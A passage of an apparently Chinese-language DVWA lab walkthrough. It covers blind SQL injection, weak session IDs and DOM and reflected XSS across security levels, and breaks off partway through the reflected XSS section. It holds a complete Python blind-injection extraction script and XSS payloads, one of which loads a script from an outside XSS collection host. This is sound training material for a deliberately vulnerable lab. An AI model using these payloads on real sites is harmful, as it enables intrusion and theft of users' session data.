class="comment"># column_name of TABLE 0x66313467313568657265:f1Ag</span></span><br><span class="line">    flag(<span class="string">&#x27;f1Ag&#x27;</span>,<span class="string">&#x27;f14g15here&#x27;</span>)</span><br><span class="line">    <span class="comment"># flag is flag&#123;this_is_a_test_flag&#125;</span></span><br></pre></td></tr></table></figure><h2 id="High-6"><a href="#High-6" class="headerlink" title="High"></a>High</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_COOKIE[ <span class="string">&#x27;id&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_COOKIE[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $getid  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27; LIMIT 1;&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $getid ); <span class="comment">// Removed &#x27;or die&#x27; to suppress mysql errors</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    $num = @mysqli_num_rows( $result ); <span class="comment">// The &#x27;@&#x27; character suppresses errors</span></span><br><span class="line">    <span class="keyword">if</span>( $num &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Might sleep a random amount</span></span><br><span class="line">        <span class="keyword">if</span>( rand( <span class="number">0</span>, <span class="number">5</span> ) == <span class="number">3</span> ) &#123;</span><br><span class="line">            sleep( rand( <span class="number">2</span>, <span class="number">4</span> ) );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// User wasn&#x27;t found, so the page wasn&#x27;t!</span></span><br><span class="line">        header( $_SERVER[ <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span> ] . <span class="string">&#x27; 404 Not Found&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，High级别的代码利用cookie传递参数id，当SQL查询结果为空时，会执行函数<code>sleep(seconds)</code>，目的是为了扰乱基于时间的盲注。同时在 SQL查询语句中添加了LIMIT 1，希望以此控制只输出一个结果。</p><p>另外，注入点变成了<code>Cookie[&#39;id&#39;]</code>,至于payload，用Low级别的就可以。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">dic = string.printable[:<span class="number">94</span>]</span><br><span class="line"><span class="comment"># print(dic)</span></span><br><span class="line"><span class="comment"># 注入点url</span></span><br><span class="line">url = <span class="string">&quot;http://localhost/dvwa/vulnerabilities/sqli_blind/&quot;</span></span><br><span class="line">TrueState = <span class="string">&#x27;exists&#x27;</span></span><br><span class="line">FlaseState = <span class="string">&#x27;MISSING&#x27;</span></span><br><span class="line">cookies = &#123;<span class="string">&#x27;security&#x27;</span>:<span class="string">&#x27;high&#x27;</span>,<span class="string">&#x27;PHPSESSID&#x27;</span>:<span class="string">&#x27;igtb1sfu1lm1gb9e4ug06i0d1e&#x27;</span>&#125;</span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.爆库名的长度</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbnameLength</span>():</span></span><br><span class="line">    <span class="keyword">for</span> DBlen <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">        PayloadofDBlen = <span class="string">&quot;1&#x27; and length(database())=&#123;&#125;%23&amp;Submit=Submit&quot;</span>.format(DBlen)</span><br><span class="line">        cookies[<span class="string">&#x27;id&#x27;</span>]=PayloadofDBlen</span><br><span class="line">        <span class="comment"># print(cookies)</span></span><br><span class="line">        response = s.get(url,cookies=cookies).text</span><br><span class="line">        <span class="keyword">if</span> TrueState <span class="keyword">in</span> response:</span><br><span class="line">            print(<span class="string">&quot;DBnamelen is &quot;</span>, DBlen)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.爆库名</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbname</span>():</span></span><br><span class="line">    DBlen = <span class="number">4</span></span><br><span class="line">    DBname = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, DBlen+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> dic:</span><br><span class="line">            DBnamePayload = <span class="string">&quot;1&#x27; and substr(database(),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; #&quot;</span>.format(i,str(c))</span><br><span class="line">            cookies[<span class="string">&#x27;id&#x27;</span>] = DBnamePayload</span><br><span class="line">            response = s.get(url,cookies=cookies).text</span><br><span class="line">            <span class="keyword">if</span> TrueState <span class="keyword">in</span> response:</span><br><span class="line">                DBname += c</span><br><span class="line">                print(DBname)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    print(<span class="string">&quot;DBname is:&quot;</span>, DBname)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.爆出所有的表名</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tableName</span>():</span></span><br><span class="line">    table_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">51</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> dic:</span><br><span class="line">            tableName_payload = <span class="string">&quot;1&#x27; and substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; #&quot;</span>.format(str(i),str(c))</span><br><span class="line">            cookies[<span class="string">&#x27;id&#x27;</span>] = tableName_payload</span><br><span class="line">            response = s.get(url, cookies=cookies).text</span><br><span class="line">            <span class="keyword">if</span> TrueState <span class="keyword">in</span> response:</span><br><span class="line">                table_name += c</span><br><span class="line">                print(<span class="string">&#x27;table_name:&#x27;</span>,table_name)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.爆出指定表的所有列名</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ColumnName</span>(<span class="params">tablename</span>):</span></span><br><span class="line">    column_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">51</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> dic:</span><br><span class="line">            columnName_payload = <span class="string">&quot;1&#x27; and substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;&#123;&#125;&#x27;),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; #&quot;</span>.format(tablename,str(i),str(c))</span><br><span class="line">            cookies[<span class="string">&#x27;id&#x27;</span>] = columnName_payload</span><br><span class="line">            response = s.get(url, cookies=cookies).text</span><br><span class="line">            <span class="keyword">if</span> TrueState <span class="keyword">in</span> response:</span><br><span class="line">                column_name += c</span><br><span class="line">                print(<span class="string">&quot;column_name of TABLE &#123;&#125;:&#123;&#125;&quot;</span>.format(tablename,column_name))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag</span>(<span class="params">columname, tablename</span>):</span></span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">51</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> dic:</span><br><span class="line">            payload = <span class="string">&quot;1&#x27; and substr((select &#123;&#125; from &#123;&#125;),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;#&quot;</span>.format(columname,tablename,i,str(c))</span><br><span class="line">            cookies[<span class="string">&#x27;id&#x27;</span>]=payload</span><br><span class="line">            response = s.get(url, cookies=cookies).text</span><br><span class="line">            <span class="keyword">if</span> TrueState <span class="keyword">in</span> response:</span><br><span class="line">                flag += c</span><br><span class="line">                print(<span class="string">&quot;flag is&quot;</span>,flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># dbnameLength()</span></span><br><span class="line">    <span class="comment"># dbname()</span></span><br><span class="line">    <span class="comment"># tableName()</span></span><br><span class="line">    <span class="comment"># table_name: f14g15here,guestbook,users</span></span><br><span class="line">    <span class="comment"># ColumnName(&#x27;f14g15here&#x27;)</span></span><br><span class="line">    <span class="comment"># column_name of TABLE f14g15here:f1ag</span></span><br><span class="line">    flag(<span class="string">&#x27;f1ag&#x27;</span>,<span class="string">&#x27;f14g15here&#x27;</span>)</span><br><span class="line">    <span class="comment"># flag is flag&#123;this_is_a_test_flag&#125;</span></span><br></pre></td></tr></table></figure><h2 id="Impossible-6"><a href="#Impossible-6" class="headerlink" title="Impossible"></a>Impossible</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">&#x27;user_token&#x27;</span> ], $_SESSION[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_GET[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Was a number entered?</span></span><br><span class="line">    <span class="keyword">if</span>(is_numeric( $id )) &#123;</span><br><span class="line">        <span class="comment">// Check the database</span></span><br><span class="line">        $data = $db-&gt;prepare( <span class="string">&#x27;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#x27;</span> );</span><br><span class="line">        $data-&gt;bindParam( <span class="string">&#x27;:id&#x27;</span>, $id, PDO::PARAM_INT );</span><br><span class="line">        $data-&gt;execute();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Get results</span></span><br><span class="line">        <span class="keyword">if</span>( $data-&gt;rowCount() == <span class="number">1</span> ) &#123;</span><br><span class="line">            <span class="comment">// Feedback for end user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// User wasn&#x27;t found, so the page wasn&#x27;t!</span></span><br><span class="line">            header( $_SERVER[ <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span> ] . <span class="string">&#x27; 404 Not Found&#x27;</span> );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for end user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，Impossible级别的代码采用了PDO技术，划清了代码与数据的界限，有效防御SQL注入，Anti-CSRF token机制的加入了进一步提高了安全性。</p><h1 id="Weak-Session-IDS"><a href="#Weak-Session-IDS" class="headerlink" title="Weak Session IDS"></a>Weak Session IDS</h1><h2 id="Low-8"><a href="#Low-8" class="headerlink" title="Low"></a>Low</h2><p>顾名思义，因为<code>Session</code>的加密算法太弱或者其他情况导致<code>sessionID</code>可以预测和伪造。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$html = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span> ($_SESSION[<span class="string">&#x27;last_session_id&#x27;</span>])) &#123;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;last_session_id&#x27;</span>] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;last_session_id&#x27;</span>]++;</span><br><span class="line">    $cookie_value = $_SESSION[<span class="string">&#x27;last_session_id&#x27;</span>];</span><br><span class="line">    setcookie(<span class="string">&quot;dvwaSession&quot;</span>, $cookie_value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>每点一次，<code>dvwaSession+1</code>，非常脆弱。</p><h2 id="Medium-8"><a href="#Medium-8" class="headerlink" title="Medium"></a>Medium</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$html = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">    $cookie_value = time();</span><br><span class="line">    setcookie(<span class="string">&quot;dvwaSession&quot;</span>, $cookie_value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>dvwaSession</code>用时间作为<code>sessionid</code>，但是依然比较容易伪造。当我需要伪造这个session的时候，可以通过一个<code>time()</code>函数完成。</p><h2 id="High-7"><a href="#High-7" class="headerlink" title="High"></a>High</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$html = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span> ($_SESSION[<span class="string">&#x27;last_session_id_high&#x27;</span>])) &#123;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;last_session_id_high&#x27;</span>] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;last_session_id_high&#x27;</span>]++;</span><br><span class="line">    $cookie_value = md5($_SESSION[<span class="string">&#x27;last_session_id_high&#x27;</span>]);</span><br><span class="line">    setcookie(<span class="string">&quot;dvwaSession&quot;</span>, $cookie_value, time()+<span class="number">3600</span>, <span class="string">&quot;/vulnerabilities/weak_id/&quot;</span>, $_SERVER[<span class="string">&#x27;HTTP_HOST&#x27;</span>], <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>加了<code>md5函数</code>，但是<code>md5(value)</code>md5的参数<code>$_SESSION[&#39;last_session_id_high&#39;]</code>导致md5的加密性不强，容易查到：</p><p><img src="https://i.loli.net/2020/03/03/JDihEq6t3ceGPfX.png"></p><h2 id="Impossible-7"><a href="#Impossible-7" class="headerlink" title="Impossible"></a>Impossible</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$html = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">    $cookie_value = sha1(mt_rand() . time() . <span class="string">&quot;Impossible&quot;</span>);</span><br><span class="line">    setcookie(<span class="string">&quot;dvwaSession&quot;</span>, $cookie_value, time()+<span class="number">3600</span>, <span class="string">&quot;/vulnerabilities/weak_id/&quot;</span>, $_SERVER[<span class="string">&#x27;HTTP_HOST&#x27;</span>], <span class="literal">true</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，Impossible级别的代码，通过加入随机数和事件来生成cookie，无意是难以猜解，非常安全的。</p><h1 id="XSS-DOM"><a href="#XSS-DOM" class="headerlink" title="XSS(DOM)"></a>XSS(DOM)</h1><blockquote><p>XSS，全称<code>Cross Site Scripting</code>，即跨站脚本攻击，某种意义上也是一种注入攻击，是指攻击者在页面中注入恶意的脚本代码，当受害者访问该页面时，恶意代码会在其浏览器上执行，需要强调的是，XSS不仅仅限于<code>JavaScript</code>，还包括flash等其它脚本语言。根据恶意代码是否存储在服务器中，XSS可以分为存储型的XSS与反射型的XSS。</p></blockquote><p>DOM，全称Document Object Model，是一个平台和语言都中立的接口，可以使程序和脚本能够动态访问和更新文档的内容、结构以及样式。DOM型XSS可能是存储型，也有可能是反射型，是基于DOM文档对象模型的一种漏洞。</p><p>在网站页面中有许多页面的元素，当页面到达浏览器时浏览器会为页面创建一个顶级的Document object文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过JS脚本对文档对象进行编辑从而修改页面的元素。也就是说，客户端的脚本程序可以通过DOM来动态修改页面内容，从客户端获取DOM中的数据并在本地执行。基于这个特性，就可以利用JS脚本来实现XSS漏洞的利用。以下属性都可能触发DOM型XSS：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">document.referer</span><br><span class="line">window.name</span><br><span class="line">location</span><br><span class="line">innerHTML</span><br><span class="line">documen.write</span><br></pre></td></tr></table></figure><h2 id="Low-9"><a href="#Low-9" class="headerlink" title="Low"></a>Low</h2><p>找XSS的漏洞，其实主要是从前端的HTML和js入手。</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">document.write(&quot;<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&#x27;English&#x27;</span>&gt;</span>English<span class="tag">&lt;/<span class="name">option</span>&gt;</span>&quot;);</span><br><span class="line">document.write(&quot;<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&#x27;French&#x27;</span>&gt;</span>French<span class="tag">&lt;/<span class="name">option</span>&gt;</span>&quot;);</span><br><span class="line">document.write(&quot;<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&#x27;Spanish&#x27;</span>&gt;</span>Spanish<span class="tag">&lt;/<span class="name">option</span>&gt;</span>&quot;);</span><br><span class="line">document.write(&quot;<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&#x27;German&#x27;</span>&gt;</span>German<span class="tag">&lt;/<span class="name">option</span>&gt;</span>&quot;);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?default&#x3D;English&lt;script&gt;alert(&#39;xss&#39;);&lt;&#x2F;script&gt;</span><br><span class="line">用XSS平台接收一下：</span><br><span class="line">?default&#x3D;English&lt;sCRiPt&#x2F;SrC&#x3D;&#x2F;&#x2F;xss.pt&#x2F;****&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/03/xZSahG1mjlYUF5R.png"></p><h2 id="Medium-9"><a href="#Medium-9" class="headerlink" title="Medium"></a>Medium</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span> ( array_key_exists( <span class="string">&quot;default&quot;</span>, $_GET ) &amp;&amp; !is_null ($_GET[ <span class="string">&#x27;default&#x27;</span> ]) ) &#123;</span><br><span class="line">    $default = $_GET[<span class="string">&#x27;default&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Do not allow script tags</span></span><br><span class="line">    <span class="keyword">if</span> (stripos ($default, <span class="string">&quot;&lt;script&quot;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">        header (<span class="string">&quot;location: ?default=English&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>通过<code>stripos()</code>函数过滤含有<code>&lt;script&gt;</code>的标签数据(不区分大小写)。但是还有很多标签如<code>&lt;vsg&gt;</code>，<code>&lt;img&gt;</code>等等绕过。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?default&#x3D;English&lt;&#x2F;option&gt;&lt;&#x2F;select&gt;&lt;img src&#x3D;1 onerror&#x3D;alert(&#39;xss&#39;)&gt;</span><br></pre></td></tr></table></figure><p>但是需要注意闭合前面的标签。</p><h2 id="High-8"><a href="#High-8" class="headerlink" title="High"></a>High</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span> ( array_key_exists( <span class="string">&quot;default&quot;</span>, $_GET ) &amp;&amp; !is_null ($_GET[ <span class="string">&#x27;default&#x27;</span> ]) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># White list the allowable languages</span></span><br><span class="line">    <span class="keyword">switch</span> ($_GET[<span class="string">&#x27;default&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;French&quot;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;English&quot;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;German&quot;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;Spanish&quot;</span>:</span><br><span class="line">            <span class="comment"># ok</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            header (<span class="string">&quot;location: ?default=English&quot;</span>);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>白名单 只允许 传的 default值 为 French English German Spanish 其中一个</strong></p><p>用<code>#</code>可以传入数据，</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?default&#x3D;English#&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h2 id="Impossible-8"><a href="#Impossible-8" class="headerlink" title="Impossible"></a>Impossible</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Don&#x27;t need to do anything, protction handled on the client side</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>服务端不做任何事情，都在前端完成，从而没有输入点，避免了XSS。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">document</span>.location.href.indexOf(<span class="string">&quot;default=&quot;</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">var</span> lang = <span class="built_in">document</span>.location.href.substring(<span class="built_in">document</span>.location.href.indexOf(<span class="string">&quot;default=&quot;</span>)+<span class="number">8</span>);</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">&quot;&lt;option value=&#x27;&quot;</span> + lang + <span class="string">&quot;&#x27;&gt;&quot;</span> + (lang) + <span class="string">&quot;&lt;/option&gt;&quot;</span>);</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">&quot;&lt;option value=&#x27;&#x27; disabled=&#x27;disabled&#x27;&gt;----&lt;/option&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">&quot;&lt;option value=&#x27;English&#x27;&gt;English&lt;/option&gt;&quot;</span>);</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">&quot;&lt;option value=&#x27;French&#x27;&gt;French&lt;/option&gt;&quot;</span>);</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">&quot;&lt;option value=&#x27;Spanish&#x27;&gt;Spanish&lt;/option&gt;&quot;</span>);</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">&quot;&lt;option value=&#x27;German&#x27;&gt;German&lt;/option&gt;&quot;</span>);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/select&gt;</span><br></pre></td></tr></table></figure><h1 id="XSS-Reflected"><a href="#XSS-Reflected" class="headerlink" title="XSS(Reflected)"></a>XSS(Reflected)</h1><h2 id="Low-10"><a href="#Low-10" class="headerlink" title="Low"></a>Low</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Hello &#x27;</span> . $_GET[ <span class="string">&#x27;name&#x27;</span> ] . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>直接将<code>$_GET[name]</code>拼接到了HTML标签中，于是容易XSS</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?name&#x3D;&lt;script&gt;alert(1);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>但是反射型XSS，一般无法弹cookie，在配合CSRF时，还有很多的操作空间。</p><h2 id="Medium-10"><a href="#Medium-10" class="headerlink" title="Medium"></a>Medium</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $name = str_replace( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $_GET[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>通过<code>str_replace</code>过滤了<code>&lt;script&gt;</code>,但是可以直接通过大小写绕过，双写绕过或使用其他标签。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;scRipt&gt;alert(&#39;XSS&#39;);&lt;&#x2F;Script&gt;</span><br></pre></td></tr></table></figure><h2 id="High-9"><a href="#High-9" class="headerlink" title="High"></a>High</h2><p>服务器端核心代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">// Is there any input? </span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123; </span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $name = preg_replace( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $_GET[ <span class="string">&#x27;name&#x27;</span> ] ); </span><br><span class="line">    <span class="comment">// Feedback for end user </span></span><br><span class="line">    